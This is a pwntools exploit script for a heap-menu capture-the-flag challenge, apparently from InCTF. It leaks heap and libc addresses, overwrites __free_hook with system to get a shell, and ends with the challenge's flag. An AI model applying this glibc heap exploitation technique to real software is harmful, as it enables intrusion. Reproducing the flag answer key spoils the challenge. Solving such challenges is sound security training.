from pwn import *

#p = remote('pwn.challenge.bi0s.in','1234')
p = process('./chall')
libc = ELF('./libc.so.6')

def Add(size,data):
    p.sendlineafter('Choice >> ','1')
    p.sendlineafter('Enter length : ',str(size))
    p.sendafter('Enter data : ',data)

def Remove(idx,off):
    p.sendlineafter('Choice >> ',str(2))
    p.sendlineafter('Enter index: ',str(idx))
    p.sendlineafter('Which one?(1337 for all) ',str(off))

def Link(From,To):
    p.sendlineafter('Choice >> ',str(3))
    p.sendlineafter('Enter to index: ',str(To))
    p.sendlineafter('Enter from index: ',str(From))

def Unlink(idx,off,ch):
    p.sendlineafter('Choice >> ',str(4))
    p.sendlineafter('Enter index: ',str(idx))
    p.sendlineafter('Enter offset: ',str(off))
    p.sendlineafter('Do you want to keep it (y/n)? ',ch)

context.log_level = 'debug'

Add(0x30,'A'*0x30) #0
Add(0x30,'B'*0x30) #1
Add(0x30,'C'*0x30) #2
Add(0x30,'D'*0x30) #3
Remove(3,1)
Link(1,0)
Link(2,0)
Unlink(0,2,'y')
Remove(1,1337)
Add(0x30,'A'*0x30) #1
Add(0x30,'B'*0x30) #2
Link(1,2)
Remove(2,2)
Remove(2,1)
Add(0x40,'B'*0x40) #1
Add(0x18,'A'*0x10+'B') #2
p.sendlineafter('Choice >> ',str(4))
p.sendlineafter('Enter index: ',str(0))
p.recvuntil('Node 0 Offset 2 : ')
heap = u64(p.recv(6)+b'\x00\x00')-0x360
p.info('heap_base: '+hex(heap))
p.sendlineafter('Enter offset: ',str(2))
p.sendlineafter('Do you want to keep it (y/n)? ','y')


Add(0x60,'A'*0x60) #4
Add(0x60,'A'*0x60) #5
Add(0x60,'A'*0x60) #6
Add(0x60,'/bin/sh\x00') #7
Add(0x60,b'A'*0x20+p64(0)+p64(0x41)) #8

Remove(0,1)
Add(0x30,p64(0)+p64(0x431)) #0

Remove(2,1)
Add(0x30,'A'*0x30) #2
Add(0x18,b'A'*0x10+p64(heap+0x2a0+0x10)) #9
Remove(3,1)
Add(0x48,'A'*10) #3
Link(2,1)

p.sendlineafter('Choice >> ',str(4))
p.sendlineafter('Enter index: ',str(1))
p.recvuntil('Node 1 Offset 2 : ')
libc_base = u64(p.recv(6)+b'\x00\x00')-0x1ebbe0
p.info('libc_base: '+hex(libc_base))
p.sendlineafter('Enter offset: ',str(2))
p.sendlineafter('Do you want to keep it (y/n)? ','y')

Remove(4,1)
Remove(1,1)
Remove(5,1)
Add(0x50,b'A'*0x30+p64(0)+p64(0x21)+p64(libc_base+libc.sym['__free_hook'])+b'A'*0x8) #1
Add(0x60,'A'*0x60) #4
Add(0x10,p64(libc_base+libc.sym['system'])) #5
Remove(7,1)

#gdb.attach(p)
p.interactive()
#inctf{Unl1nk_f0r_the_w1n_c5aa6ab6c04916}